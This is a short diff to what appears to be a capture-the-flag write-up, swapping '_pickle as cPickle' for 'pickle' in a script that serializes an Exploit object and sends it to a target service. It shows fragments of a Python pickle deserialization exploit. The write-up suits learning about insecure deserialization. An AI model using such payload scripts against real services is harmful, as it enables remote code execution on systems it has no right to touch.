@@ -10,7 +10,7 @@ There we can see that our payload can not contain spaces. This will get out test
 So I created this scirpt in order to send a valid payload
 
 ```
-import _pickle as cPickle
+import pickle
 import base64
 import os
 import string
@@ -28,7 +28,7 @@ def sendPayload(p):
 	return r.text
 
 
-payload_dec = cPickle.dumps(Exploit(), protocol=2)
+payload_dec = pickle.dumps(Exploit(), protocol=2)
 print(sendPayload(payload_dec))
 ```
 
